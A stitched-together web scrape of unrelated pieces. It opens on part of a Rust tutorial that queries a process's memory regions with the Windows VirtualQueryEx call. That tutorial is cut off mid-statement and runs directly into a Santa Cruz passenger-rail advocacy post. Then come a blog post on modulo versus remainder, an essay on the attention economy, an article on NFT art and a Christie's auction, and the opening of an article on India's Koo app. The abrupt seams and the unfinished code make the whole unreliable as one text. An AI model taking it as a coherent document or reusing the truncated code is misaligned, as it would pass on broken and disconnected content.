virtual address space of a specified process.</p></blockquote><p>We have enumerated things before, and this function is not all that different.</p><pre><code data-lang="rust">fn memory_regions(&amp;self) -&gt; io::Result&lt;winapi::um::winnt::MEMORY_BASIC_INFORMATION&gt; {
    let mut info = MaybeUninit::uninit();

    // SAFETY: the info structure points to valid memory.
    let written = unsafe {
        winapi::um::memoryapi::VirtualQueryEx(
            self.handle.as_ptr(),
            std::ptr::null(),
            info.as_mut_ptr(),
            mem::size_of::&lt;winapi::um::winnt::MEMORY_BASIC_INFORMATION&gt;(),
        )
    };
    if written == 0 {
        Err(io::Error::last_os_error())
    } else {
        // SAFETY: a non-zero amount was written to the structure
        Ok(unsafe { info.assume_init() })
    }
}
</code></pre><p>We start with a base address of zero<sup><a href="#3">3</a></sup> (<code>std::ptr::null()</code>), and ask the function to tell us what's in there. Let's try it out, with the <code>impl-debug</code> crate feature in <code>Cargo.toml</code>:</p><pre><code data-lang="rust">dbg!(process.memory_regions());
</code></pre><pre><code>&gt;cargo run
Compiling memo v0.1.0

error[E0277]: `winapi::um::winnt::MEMORY_BASIC_INFORMATION` doesn't implement `std::fmt::Debug`
   --&gt; src\main.rs:185:5
    |

    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ `winapi::um::winnt::MEMORY_BASIC_INFORMATION` cannot be formatted using `{:?}` because it doesn't implement `std::fmt::Debug`
</code></pre><p>That's annoying. It seems not everything has an <code>impl std::fmt::Debug</code>, and <a href="https://github.com/retep998/winapi-rs/issues/548#issuecomment-355278090">you're supposed to send a PR</a> if you want it to have debug, even if the <code>impl-debug</code> feature is set. I'm surprised they don't auto-generate all of this and have to rely on manually adding <code>Debug</code> as needed? Oh well, let's get rid of the feature and print it out ourselves:</p><pre><code>eprintln!(

<p><strong>The movement to bring quality public transit to our county just achieved a major milestone:</strong></p>
<p>Electric Passenger Rail is now the official Locally Preferred Alternative (LPA) for service along the rail corridor between Watsonville and Santa Cruz! At the February Regional Transportation Commission (RTC) meeting, the commissioners chose rail with a <strong>resounding 9 to 3 vote</strong>.&nbsp;</p>
</div>
				</div>
				</div>
				<div data-id="83e0ff4" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>What is the LPA and Why does it Matter?</h2>		</p>
				</div>
				<div data-id="f017835" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>A Locally Preferred Alternative is a formal designated choice of a transit mode, such as bus or rail, for a given project. Having an officially approved LPA will allow us to apply for state and federal grants to pay for the new transit system.&nbsp;</span></p>
<p><span>It’s also important to know that different transit modes have different sources of funding (sometimes referred to as funding buckets). The </span><a href="https://dot.ca.gov/programs/rail-and-mass-transportation/california-state-rail-plan" target="_blank" rel="noopener"><span><span>State Rail Plan</span></span></a><span> is California’s guide to reduce transportation GHG emissions by switching from highway expansion to rail expansion. The plan includes dramatically expanding rail funding in order to implement a robust regional rail network. In other words, there’s now a big funding bucket for rail in California.&nbsp;</span></p>
<p><span>Because the RTC commissioners chose rail for our LPA, our rail line will continue to be included in the State Rail Plan and stay eligible to apply for rail funds. It appears the federal government is making the same shift towards increased rail funding under the Biden Administration. As an added bonus, once METRO becomes part of our new rail transportation system, it will also be eligible for funding from the rail bucket.&nbsp;</span></p></div>
				</div>
				</div>
				<div data-id="3650f8f" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Community and Agency Support for the Rail LPA</h2>		</p>
				</div>
				<div data-id="774eb4e" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Throughout 2020 and early 2021, the RTC staff and consultants were engaged in the Transit Corridor Alternatives Analysis (TCAA) study to determine which transit mode would be best for our rail corridor. The study used a triple bottom line analysis, considering Equity, Economy, and the Environment. The final study outcome recommended Electric Passenger Rail as the best alternative.</span></p>
<h4><b>Community Outreach Efforts and Results</b></h4>
<p><span>Public opinion was part of the TCAA study, and Friends of the Rail &amp; Trail volunteers worked hard to encourage the public to participate.&nbsp;</span></p>
<ul>
<li aria-level="1"><span>We asked people to submit comments, write emails, and phone commissioners. In the final count, about 80% of all public comments to the RTC expressed support for passenger rail.&nbsp;</span></li>
<li aria-level="1"><span>We asked people to participate in three RTC open-house events, including online surveys. In the last survey, 75% of the almost 1,000 participants affirmed the choice of electric passenger rail.&nbsp;</span></li>
<li aria-level="1"><span>Lastly, we helped members of the public access the multiple, sometimes-grueling remote RTC meetings, and many of our supporters offered public testimony. Speakers in support of rail outnumbered opponents at least 2 to 1 at every public hearing.</span></li>
</ul>
<h4><b>Government and Agency Input</b></h4>
<p><span>Many government agencies sent letters of support for rail to the RTC, including the Caltrans Division of Rail and Mass Transportation, the California Coastal Commission, Santa Cruz City Council, Watsonville City Council, the Transportation Agency for Monterey County, the RTC Interagency Technical Advisory Committee, and the two RTC citizen advisory committees related to equity and accessibility: the Bicycle Advisory Committee and the Elderly &amp; Disabled Transportation Advisory Committee.&nbsp;</span></p>
<h4><b>Nonprofit Organization Input</b></h4>
<p><span>Many community organizations also sent letters of support for rail to the RTC, including the local chapter of the Sierra Club, Bike Santa Cruz County, Regeneración Pajaro Valley, the Campaign for Sustainable Transportation, and Ecology Action.</span></p></div>

				<div data-id="c7e44ab" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Was the Choice for Rail Certain?</h2>		</p>
				</div>
				<div data-id="e4bfa3d" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Despite all this community support, and the fact that the Transit Corridor Alternatives Analysis study recommended Electric Passenger Rail as the LPA, the outcome of the February vote was not a given. It was only after a lively debate that the RTC commissioners voted 9 to 3 to accept the study’s recommendation for rail.</span></p>
<p><span>Our thanks go to Chair Aurellio Gonzalez, Commissioners Greg Caput, Eduardo Montesino, Sandy Brown and Mike Rotkin, and to Commissioner alternates Donna Meyers, Virginia Johnson, Patrick Mulhearn, and Andy Schiffrin. They showed a commitment to the data-driven public process that selected rail as the best option for Santa Cruz County.</span></p></div>
				</div>
				</div>
				<div data-id="21abf34" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>What Does this Mean? What is Next?</h2>		</p>
				</div>
				<div data-id="764cdfd" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>First, the choice of rail for the LPA means that construction on the Rail Trail can continue without delay!</span></p>
<p><span>On the transit front, the RTC staff will now prepare a Business Plan outlining the steps needed to implement a county-wide transit network. Passenger rail with synchronized METRO bus connections will be the foundation of this new transit system. The TCAA made it overwhelmingly clear that this rail-based system far outperforms any other alternative. Now that the RTC has officially recognized this fact, we can move on to refining the costs, the potential funding streams, and the construction schedules for all the parts of the network.&nbsp;</span></p>
<p><span>The trail only / rail never crowd is not going away. Until the Rail Trail is finished and passenger rail is running, we will need your continued support. If you have not already done so, please follow us on <a href="https://www.facebook.com/CoastConnectSCC" target="_blank" rel="noopener">social media</a>, and <a href="https://secure.everyaction.com/7awHNSEYGU6AHLOdNeBlrw2" target="_blank" rel="noopener">endorse the Coast Connect vision</a>.</span></p></div>
				</div>
				</div>
				
				<div data-id="e9000eb" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span>This was a decision with multi-generational impacts on equity, the environment, and our quality of life. By choosing rail for the LPA, the RTC preserved a critical opportunity and made progress towards a future where Santa Cruz County becomes a better place for everyone who lives, works, and plays here. Rail and Trail supporters sent emails to the commission, attended the public meetings, and spoke out in favor of rail at these meetings. Your actions provided the support that the commissioners needed in order to vote for such a visionary project. They couldn’t have done it without you. Again and again, you really came through when it mattered. That is what friends do!</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Get ready, here comes some fringe pedantry that could very well be the difference in an interview, or the thing that saves you from hours of chasing a production bug!</p>
<p>I’m teeth-deep into the next season of <a href="https://bigmachine.io/projects/imposters-handbook-presale">The</a> <a href="https://bigmachine.io/products/the-imposters-handbook-season-2">Imposter’s</a> <a href="https://bigmachine.io/projects/imposters-handbook-presale">Handbook</a> and currently, I’m writing about RSA, the cipher that powers SSH and is, evidently, the most downloaded bit of code in history.</p>
<p>I want to know the story behind this thing. Who came up with it, how it works, why it works, and will it&nbsp;<em>keep working</em>. So far, I’ve dug up <strong>one hell of a story.</strong> I’m not a crypto wonk, but I can see how people get sucked right into this field. I’m not really cut out for it, however, because little rabbit holes exist everywhere and I’m kind of like a magpie-rabbit: <em>I chase shiny things down deep holes</em>. I’m also super amazing with metaphors.</p>
<p>Anyway: last week I found out something weird that I thought I would share:&nbsp;<em>mod and remainder are not the same thing</em>. The really fun thing about that statement is that there are a small fraction of people reading this, jumping out of their chairs saying “NO SHIT I’VE BEEN TRYING TO TELL YOU AND EVERYONE ELSE FOREVER”.</p>
<p>Shout out to mods-not-remainder crew! This one’s for you.</p>
<h2 id="whats-a-mod">What’s a Mod?</h2>
<p>I had to look this up to, just like the last time the subject came up. It’s one of those things that&nbsp;<em>I know</em>, but don’t retain. When you “mod” something, you divide one number by another and take the remainder. So: <em>5 mod 2</em> would be 1 because 5 divided by 2 is 2 with 1 left over.</p>
<p>The term “mod” stands for the <em>modulo</em> operation, with 2 being the&nbsp;<em>modulus</em>. Most programming languages use <code>%</code>&nbsp;to denote a modulo operation: <code>5 % 2 = 1</code>.&nbsp;</p>
<p>That’s where we get into the weird gray area:&nbsp;<em>1 is the remainder, not necessarily the result of a modulo.</em>&nbsp;</p>
<h3 id="clock-math">Clock Math</h3>
<p>I remember learning this in school, and then forgetting it. There’s a type of math called “Modular Mathematics” that deals with cyclic structures. The easiest way to think of this is a clock, which is cyclical in terms of the number 12. To a mathematician, a clock is <code>mod 12</code>. If you wanted to figure if 253 hours could be evenly divided into days, you could use <code>253 mod 24</code>, which <a href="https://www.google.com/search?q=253+mod+24">comes out to 13</a> so the answer would be no! The only way it could be “yes” is if the result was 0.</p>
<p>Another question you could answer would be “if I start on a road trip at 6PM, what time would it be when I get to my destination 16 hours later?”. That would be <code>6 + 16 mod 12</code> which is 10.</p>
<p><em>I originally mentioned that 253 hours mod 24 could be used to determine the number of days which was totally wrong… thanks Phil for pointing that out.</em></p>
<p>Cryptographers love <code>mod</code> because when you use it with really large numbers you can create what are known as&nbsp;<em>one-way functions</em>.&nbsp;These are special functions which allow you to easily calculate something in one direction, but not reverse it.</p>
<p>If I tell you that 9 is the result of my squaring operation, you can easily deduce that the input was 3 (or -3 as the case may be). You would have the entire process front to back. If I tell you that 9 is the result of my function <code>mod 29</code>, you would have a harder time trying to figure out what the input was.</p>
<p>Crypto folks like this idea because they can use a modulo with gigantic prime numbers in order to generate a cryptographic key. That’s a whole other story and you can <a href="https://bigmachine.io/products/the-imposters-handbook-season-2">buy the book</a> if you want to read about it.</p>
<p>I need to stay on track.</p>
<h2 id="remainders-and-clock-math">Remainders and Clock Math</h2>
<p>Now we get down to it: modulo and remainder act the same when the numbers are positive but much differently when the numbers are&nbsp;<em>negative</em>.&nbsp;</p>
<p>Consider this problem:&nbsp;</p>
<div><div><pre><code>const x = 19 % 12;
console.log(x);
</code></pre></div></div>
<p>What’s the value of <code>x</code>? Some quick division and we can say there’s a single 12 with 7 left over, so 7 is our answer, which is correct. How about this one:</p>
<div><div><pre><code>const y = 19 % -12;
console.log(y);
</code></pre></div></div>
<p>Using regular math, we can multiply -12 by -1, giving us 12, and we still have 7 left over, so our answer is 7 once again.</p>
<p>JavaScript agrees with this:</p>
<p><img src="https://rob.conery.io/img/screenshot_956.png" alt=""></p>
<p>C# also agrees with this:</p>
<p><img src="https://rob.conery.io/img/screenshot_957.png" alt=""></p>
<p>Google agrees with the first statement, but <strong>disagrees with the second</strong>:</p>
<p><img src="https://rob.conery.io/img/screenshot_958.png" alt=""></p>
<p>Ruby agrees with Google:</p>
<p><img src="https://rob.conery.io/img/screenshot_959.png" alt=""></p>
<p><strong>What in Djikstra’s name is HAPPENING HERE!</strong></p>
<h2 id="spinning-the-clock-backwards">Spinning The Clock Backwards</h2>
<p>The answer to this problem is understanding the difference between a&nbsp;<em>remainder</em> and a&nbsp;<em>modulo</em>.&nbsp;<strong>Programmers conflate these</strong> operations and they should not, as they only act the same when the divisor (in our case 12) is positive. You can easily send bugs into production if your divisor is negative.</p>
<p>But why is there a discrepancy? Consider the positive modulo <code>19 mod 12</code>&nbsp;using a clock:</p>
<p><img src="https://rob.conery.io/img/Paper.Imposter-v2.60.png" alt=""></p>
<p>The end result is a 7, as we know, and we can prove this using some math. But what about <code>19 mod -12</code>?&nbsp;<strong>We have to use a different clock</strong>:</p>
<p><img src="https://rob.conery.io/img/Paper.Imposter-v2.61-2.png" alt=""></p>
<p>Our modulus is -12, and we can’t ignore that or change it by multiplying by -1 as that’s not the way modular math works. The only way to calculate this correctly is to relabel the clock so that we progress from -12, or spin the clock counterclockwise, which yields the same result.</p>
<p>Why don’t I number the clock starting with -1 and moving on to -2, etc?&nbsp;<em>Because that would be moving backwards</em>, continually decreasing until we hit -12, at which point we make a +12 jump, which isn’t how modulo works.</p>
<h2 id="this-is-a-known-thing">This Is a Known Thing</h2>
<p>Before you think I’m nuts and start Googling on the subject: <a href="https://github.com/ramda/ramda/issues/186">it’s been known for a while</a>&nbsp;In fact, MDN (Mozilla Developer Network) goes so far as to call <code>%</code>&nbsp;the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Arithmetic_Operators#Remainder_()">remainder operation</a>:</p>
<blockquote>
<p>The <strong>remainder operator</strong> returns the remainder left over when one operand is divided by a second operand. It <strong>always takes the sign of the dividend</strong>.</p>
</blockquote>
<p>Eric Lippert, one of the gods of C#, <a href="https://blogs.msdn.microsoft.com/ericlippert/2011/12/05/whats-the-difference-remainder-vs-modulus">says this</a> about C#’s modulo:</p>
<blockquote>
<p>However, that is not at all what the&nbsp;%&nbsp;operator actually does in C#. The&nbsp;%&nbsp;operator is not the&nbsp;canonical modulus operator, it is the&nbsp;remainder operator.</p>
</blockquote>
<p>What does your language do?</p>
<h2 id="so-what">So What?</h2>
<p>I can understand if you’ve made it this far and are scratching your head some, wondering if you should care. I think you might want to for 2 specific reasons:</p>
<ol>
<li>I can see this coming up in an interview question, catching me completely off guard and</li>
<li>I can see pushing a bug live and spinning for hours trying to figure out why math doesn’t work</li>
</ol>
<p>It could also be a fun bit of trivia to keep in your pocket for when your pedantic programmer friend drops by.</p>

<p>
Some people saw the thrashing idscape in which we tribulate coming from a long way off. And they called it “the attention economy.”
</p>
<p>
A recent <a href="https://www.nytimes.com/2021/02/04/opinion/michael-goldhaber-internet.html" target="_blank">New York Times opinion column by Charlie Warzel</a> reminded me that as easy as it has been to trace some of the more dangerous effects of the attention economy to events of the last decade, some people could tell where things were headed long, long before that. One of them was Michael Goldhaber, a theoretical physicist and, as Warzel grandly introduces him, “the internet prophet you’ve never heard of.” Well, he had me at <i>internet</i>. And <i>prophet</i>. And <i>never heard of</i>.
</p>
<p>
Goldhaber has been writing about the attention economy for decades. In fact, back in 1997, he wrote an <a href="https://www.wired.com/1997/12/es-attention/" target="_blank">essay for <span>WIRED</span></a> about how the transactions of our dollars-and-cents economy would not only begin to include exchanges of attention, but would eventually be replaced entirely by them. For a population just getting to know the internet, the idea that attention would matter more than money was preposterous. For us who now know it well, it’s remarkably on-point.
</p>
<p>
Looking back, it’s fascinating — and more than a little bit concerning — to note that Goldhaber’s own pessimism was far more accurate than his optimism. He earnestly predicted that attention would replace money because “attention can’t be bought.” Well, it turns out that it very much can. And as utopic as a moneyless future sounds, a future in which attention replaces money as our currency seems obviously worse when you consider what Goldhaber got <i>right</i>. He warned that the pressure individuals would feel to both attract and give attention would metastasize into a wide-spreading erosion of culture. Goldhaber believed that simple human psychology predicted this. He wrote, “Our abilities to pay attention are limited. Not so our abilities to receive it. The value of true modesty or humility is hard to sustain in an attention economy.” In a recent conversation in preparation for Charlie Warzel’s op-ed, Goldhaber echoed the same point: “When you have attention, you have power, and some people will try and succeed in getting huge amounts of attention, and they would not use it in equal or positive ways.”
</p>
<p>
We’ve all lived and suffered that truth, especially acutely over the last few years, haven’t we? Warzel sums it up this way, “Attention is a bit like the air we breathe. And it feels as if our attention has become polluted.”
</p>
<p>
Warzel connects Goldhaber’s early warnings to their latest effects, including the attempted insurrection on January 6th. The mob may have been after many different things, but the one thing every participant seems to have had in common was a desire for attention. The event itself, he writes, was “the result of thousands of influencers and news outlets that, in an attempt to gain fortune and fame and attention, trotted out increasingly dangerous conspiracy theories on platforms optimized to amplify outrage.” Implied here is something I’d been observing as an increasingly rapid contagion of anti-truth since the day Donald Trump descended his escalator to declare his intention to destroy the country: that conspiracies and accusations of conspiracy are <i>products</i>, not byproducts of the attention economy. They’re not something to believe in, but merely material to exchange for attention. In an inversion of assumptions about meaning, it’s no longer relevant whether a person <i>believes</i> what they are saying as long as it is understood <i>why</i> they are saying it. Lies can be quite expedient.
</p>
<p>
That the attention economy is oversupplied with bile and bullshit is a compound problem. It’s obvious that the effects of peddling and buying lies can be profound. People can lose their grips on reality. Systems upon which many rely can fall apart. The equity of hundreds of years of history can dry up in a moment. These are the agonies of our public reckoning with how technology, truth, and treason have mixed and mingled in recent years. But we may get past this very shared and public struggle with truth and technology and still suffer the erosion of culture that Goldhaber warned about. Culture, after all, is bigger than political partisanship, bigger than sovereign nations, bigger than infrastructure, bigger than multinational corporations. Culture is a tapestry of ideas, beliefs, and agreements. And as powerful as any idea or belief or agreement may be, each relies upon attention.
</p>
<p>
Goldhaber also wrote, “When you pay attention to one thing, you ignore something else.” That is such a simple statement, but it’s no less profound. It explains why thousands of articles go unread as you read this one — simple, indeed — but also why the aggregate of billions of equally simple exchanges of attention lead to the grand murmurations of culture.
</p>
<p>
If attention is an economy, then, in theory, it should follow a simple law of supply and demand just like any other economic system. In other words, the value and supply of attention should settle at a point where the there’s enough attention to meet demand. The problem is that while such a balance can be expected of bars of gold or even shares of a videogame retailer’s stock, attention works by its own rules that upend the law of supply and demand. There will never be enough attention to meet demand.
</p>
<p>
Goldhaber puts it this way:
</p>
<blockquote>
“The attention economy is a zero-sum game. What one person gets, someone else is denied. The size of the attention pie can grow as more and more people join the world audience, but the size of the average slice can’t. Real attention to you, meaning minds focusing on you, is always limited by the number of minds there are. The more minds, the more attention - but also the more who might want attention. The total available attention per capita (per mind) is simply not going to change.”
</blockquote>
<p>
These very words that I have written and that you are now reading provide a good example of what Goldhaber is talking about. You’re reading this. That’s good for me. But that also means there are billions of things you’re <i>not</i> reading. That’s not good for the people who wrote them and whatever attention they hoped to get from you. Meanwhile, every moment that you spend paying attention to me is not only a moment you’re not paying attention to someone else, it’s a moment you’re not spending doing something that could get you attention. That’s where the law of supply and demand breaks down. Attention can’t be stored up or mass produced; it’s an inherently temporal matter. The more attention we pay, the less we can get.
</p>
<p>
But what if you don’t care about getting attention? This is a question that should be asked. It’s easy enough to say that the internet, and specifically things like social media, have trained us to desire and seek attention more and more rapidly than we did before. I’m willing to accept that as true. But I don’t think we can say that every one of us has been affected in the same way, or that the desire for attention has increased equally across all of humanity, or that the form attention takes and the means by which we seek it is a singular thing. Of course it is not. Though there are people willing to do all kinds of things simply for attention, not all of us go to such lengths. But even so, we do seek attention and we do pay it out. Our transactions may be much more mundane than a streamed coup, but they exist nonetheless and they are a finite resource.
</p>
<p>
That makes me wonder whether, through the frame of the attention economy, we are seeing its mechanics all wrong.
</p>
<p>
In the zero-sum attention game, the reader, you, gives the writer, me, your attention. You only get what I have written, for as long as you’re reading it. But by these terms, I stand to get “more.” There could be thousands of you reading this at the same time. Though I can’t store your attention on the shelf, I can still get more than I pay out. If I’m a good writer, I “win” the game. Is that really the best way to think of this? After all, surely you stand to gain something, too. In the zero sum attention game, I am the beneficiary of your attention. But what if we chose to reverse that? What if we chose to see the beneficiary of the attention economy not as the recipient, but as the one paying attention?
</p>
<p>
Perhaps, then, we might think differently about information. We might begin to care more about its <i>value</i> than its volume.
</p>
<p>
<a href="https://en.wikipedia.org/wiki/Ren%C3%A9_Girard" target="_blank">René Girard</a> was a widely influential thinker who certainly would have agreed. Girard is probably most famous for his thinking about the nature of human desire. He proposed that it’s not a singular phenomenon, but an aggregate effect. His <i>mimetic theory</i> suggests that what you and I want is not original, but derives from what others want — that desire is an imitation. <i>Mimesis</i> is mimicry.
</p>
<p>
Naturally, this is a fiercely debated point. Even right now, you may be thinking of half a dozen things that you’ve chosen for your own reasons, perhaps even at the resistance of others. That something as obviously personal as desire is really just the imitation of someone else’s desire seems, on its face, to be absurd. Is your favorite breakfast cereal really the end of an infinite regress of desires, and if so, originating with whom? That I can’t answer. Perhaps there’s a Girard scholar out there who can.
</p>
<p>
But the more interesting thing about Girard’s theories is the broader idea that, as this <a href="https://www.reddit.com/r/ThePortal/comments/cfmtq2/peter_thiel_during_the_portal_about_the_book/euiv3op/?utm_source=share&amp;utm_medium=web2x" target="_blank">incredibly robust Reddit explanation</a> puts it, “secrets may exist in far more abundance than we realize <span>AND</span> YET…There are reasons we don’t see them. And those reasons involve the details, mechanics and implications of Girard’s theories. How we focus our desire and our attention is less under our control than we realize.”
</p>
<p>
Regardless of the question of origin in Girard’s theory of desire, the mechanics of how desire and attention work together to influence people are obvious. This is why fortunes can be created within hours of a photograph of a celebrity wearing something interesting being published online. …</p></div></div>

      <p>Next week the venerable British auction house Christie’s will set a precedent: It’s conducting the first ever auction of a digital artwork. And just to spice things up, there’s a crypto component to it all.&nbsp;</p>
<p><span>The groundbreaking Christie’s auction will feature the work of an artist calling himself </span><a href="https://www.beeple-crap.com/"><span>Beeple</span></a><span>. The artwork being sold is a massive digital collage of five thousand pieces of work Beeple has released on the internet daily over 5,000 days.&nbsp;</span></p>
<p><span>That art is delivered in the form of a plain old JPG, of the sort that you might encounter on any website. The crypto twist is that a unique digital token on the Ethereum blockchain (</span><a href="https://etherscan.io/address/0x2a46f2ffd99e19a89476e2f62270e0a35bbf0756#code"><span>you can see the code here</span></a><span>) was “minted”&nbsp;by the artist, connecting it to the JPG file. To be precise, a </span><a href="https://simple.wikipedia.org/wiki/Cryptographic_hash_function"><span>cryptographic hash</span></a><span> of the image is embedded in a smart contract on the Ethereum blockchain. It’s sort of like painters of yore signing a canvas, except this takes place cryptographically, and on a blockchain. These are called non-fungible tokens, or NFTs.&nbsp;</span></p>
<p><span>The Christie’s auction is eagerly awaited. The auction house had earlier dabbled in crypto art with the October 2020 sale of a physical installation linked to an NFT called “Block 21”. That piece </span><a href="https://www.nbcnews.com/tech/tech-news/how-blockchain-technology-reached-christie-s-changed-art-world-along-n1244951"><span>fetched $130,000</span></a><span> or almost 11 times its low estimate. &nbsp;</span></p>
<p><span>But the upcoming Beeple auction could bring in much more. Beeple </span><a href="https://unchainedpodcast.com/beeple-on-how-and-why-he-raked-in-3-5-million/"><span>earlier sold $3.5 million worth</span></a><span> of digital tokens in a single weekend in December, a landmark amount in the burgeoning field of crypto art. These sales happened on crypto focused marketplaces, so the Christie’s event is expected to expose the artist to a whole new crowd, as </span><a href="https://www.artnews.com/art-news/market/christies-beeple-blockchain-art-sale-1234583847/"><span>Art News has reported</span></a><span>.&nbsp;</span></p>
<p>Indeed, Christie’s alludes to this in its prospectus accompanying the auction. The earlier sales make putting a price estimate on the upcoming event “impossible to predict,” the auction-house says. “Your guess is as good as ours,” said Noah Davis, the Christie’s specialist overseeing the sale, in the prospectus. &nbsp;</p>
<h2>Here Come the Tech Moguls</h2>
<p><span>Christie’s isn’t alone in recognizing the potential —&nbsp;and chasing the returns —&nbsp;on crypto collectibles. Tech moguls appear to be enthusiastic about the trend. Mark Cuban kicked it all off at the end of January when he wrote a blog post praising “the store of value generation,”&nbsp;</span><span>a new cohort of people who understood that digital objects on a blockchain could hold their value just as well as a fine art painting, vintage car or rare baseball collection.&nbsp;</span></p>
<p><span>“This generation knows that a smart contract and the digital good it reflects … are a better investment than old school see, touch or feel uses,” the </span><a href="https://blogmaverick.com/2021/01/31/the-store-of-value-generation-is-kicking-your-ass-and-you-dont-even-know-it/'"><span>Shark Tank star wrote</span></a><span>.</span></p>
<p><span>Cuban’s fellow tech elites have followed his lead. The billionaire Chamath Palihapitiya </span><span>told Bloomberg</span><span> a few days ago that he has been building a “fairly sizeable” collection of digital art and other NFTs. “These may sound crazy to some, but I do think that that’s the next frontier of digital currency and digital assets,” he said. Palihapitiya is a long-time Bitcoin bull, and rumored sightings of the crypto whale had trickled through the Ether for weeks. “</span><span>Is that you, @Chamath?</span><span>” became a punch-line in NFT circles.&nbsp;</span></p>
<p><span>Yesterday, the wine entrepreneur turned tech investor Gary Vaynerchuk </span><a href="https://twitter.com/CNBCFastMoney/status/1362192935937323011?s=20"><span>took to CNBC</span></a><span> to extol the virtues of NFTs and other alternative investments, including trading cards. He had been steadily increasing mentions of crypto tokens on his Twitter feed, where he talks to 2.2 million followers, over the last week (he also started following me, for some reason!). Here he is </span><a href="https://twitter.com/garyvee/status/1361886864538562568?s=20"><span>on Wednesday</span></a><span>: “My current situation - I’m trying to trade cases of Chateau D'Yquem for #NFT. 2021 life, lol”</span></p>
<p><span>The tech millionaires and Christie’s are on to something. According to the </span><a href="https://cryptoart.io/data"><span>data site CryptoArt.io</span></a><span>, the value of all crypto art that changed hands in January was nearly $12 million. Twelve months ago, that figure stood at $160,000, representing growth of over 100 times over 12 months. February’s volumes have already topped January’s, and we’re only 18 days in.&nbsp;</span></p>
<p><span>A report from data site NonFungible.com and L’Atelier, a unit of the French bank BNP Paribas </span><a href="https://nonfungible.com/blog/nft-yearly-report-2020"><span>released this week</span></a><span> says that crypto art now represents 24% of the entire NFT marketplace by value, accounting for the biggest ticket sales. The art segment lags only NFTs associated with “metaverses” or virtual worlds where users can buy pieces of land, outfits and other items that are secured by a blockchain.&nbsp;</span></p>
<h2><span>The dark side of crypto art</span></h2>
<p><span>As investors pile in to crypto art, and artists make millions from their sale, surely the utopian vision of a blockchain cutting out intermediaries and rewarding creators has been realized? Maybe not, as it turns out.&nbsp;</span></p>
<p><span>Beatriz Helena Ramos is the founder of a pioneering crypto art platform called </span><a href="https://dada.art/"><span>Dada</span></a><span>. An artist herself, she has worked on everything from editorial illustrations for the New York Times to animations for Disney and MTV. To hear Ramos tell it, the surging crypto art market has become successful—at the wrong thing.&nbsp;</span></p>
<p>“What’s happening in the space is that the technology is very innovative, yet all of the social layer and the economic layer is just a repetition of everything from the legacy, default, world,” she says. “What we see with NFTs is that it’s producing the exact same outcomes that we were trying to disrupt.”</p>
<p>What are those outcomes, exactly? Ramos says the market remains tilted in favor of investors, and the vast majority of artists aren’t going to sell their work for millions the way Beeple has. Instead, they will toil in the long tail of art, replicating the star system of the current art market.&nbsp;</p>
<p><span>A </span><a href="https://powerdada.medium.com/the-inconvenient-truth-about-secondary-markets-886d5c929efa"><span>study by Massimo Franceschet</span></a><span>, a computer scientist at the University of Udine, on the largest crypto art platform Superrare shows that the crypto art market has more wealth disparity among artists than any country in the history of the world. Some 80% of sales go to the top 25% of artists. While artists on Superrare at present earn the lion’s share of sales volume, but as artworks get resold on secondary markets, Franceschet expects collectors to start earning more than artists by next June.&nbsp;</span></p>
<p><span>Ramos says she sees the human side of these statistics often. “We see the casualties coming to us all the time. Tons of people who leave the space because they never sold anything, because they have to shill, because collectors actually harass artists on these chats and Discord channels. We’ve heard some horror stories, and there’s no accountability for anything,” she says.&nbsp;</span></p>
<p>While blockchains hold out the possibility of tokenizing anything, they also quickly run into the limits of this reductive logic. As Ramos says, turning everything into a market leads to “perverse” incentives, like an artists’s work rising after her death, ensuring the supply of work is limited. “Markets can’t account for anything that isn’t quantitative,” she tells me. &nbsp;</p>
<p>Still, the lure of a blockchain’s ability to shift paradigms holds Ramos in its sway. She and a community of artists and technologists at Dada are working on a system that they believe will create fairer outcomes for artists and participants. They are focused on the social implications, and how the system might be governed.&nbsp;</p>
<p>“You can have huge networks with network effects, coordinating people with each other and creating things. You don’t need structures like companies and things like that,” she says. <span>“</span>Imagine the quality and broad value that can be created. All you have to do is coordinate them. And so blockchain comes again.”</p>

<p>It hasn’t been a quiet few weeks on Twitter in India. The country’s capital city has seen over four months of protest after Prime Minister Narendra Modi’s government enacted agricultural laws that would adversely affect farmers across India. <a href="https://www.bbc.com/news/world-asia-india-55899754">The farmer protests</a>, as the movement has come to be known, has taken to social media platforms like Twitter and Facebook to make the cause heard globally — and it’s worked. Earlier this month, celebrities like <a href="https://www.dw.com/en/greta-thunberg-under-fire-for-tweeting-about-indian-farmers-toolkit/a-56458306">Greta Thunberg</a> and <a href="https://www.bbc.com/news/world-asia-india-55931894">Rihanna</a> weighed in with their tweets of support. Backlash <a href="https://www.bbc.com/news/world-asia-india-55931894">soon followed</a>.&nbsp;</p>



<p>But the government’s ire against global critics of Modi’s Hindu nationalist party has turned to Twitter itself. Citing threats to public order, on February 1, Indian authorities <a href="https://www.buzzfeednews.com/article/pranavdixit/indian-government-block-critics">appeared to have requested Twitter to suspend or remove</a> dozens of accounts on its platform. Twitter briefly complied but, after public outcry, reinstated the accounts and then <a href="https://www.cjr.org/the_media_today/twitter-stands-up-to-india-and-refuses-to-block-journalists.php">refused to remove</a> hundreds more.</p>



<p>It’s in the middle of this battle that Aprameya Radhakrishna’s 10-month-old social media platform was thrust into the spotlight. Soft-spoken and studious, Radhakrishna is a serial entrepreneur: in 2015, <a href="https://economictimes.indiatimes.com/magazines/panache/taxiforsure-founder-aprameya-radhakrishnas-life-after-sell-off/articleshow/48078627.cms">he sold his first company</a>, a ride-sharing app called TaxiForSure, to local giant Ola for $200 million. His latest venture is an app called Koo, <a href="https://www.kooapp.com/">a microblogging platform similar to Twitter</a> but for local-language speakers in India, a country with more than 20 languages and over 700 dialects.&nbsp;</p>



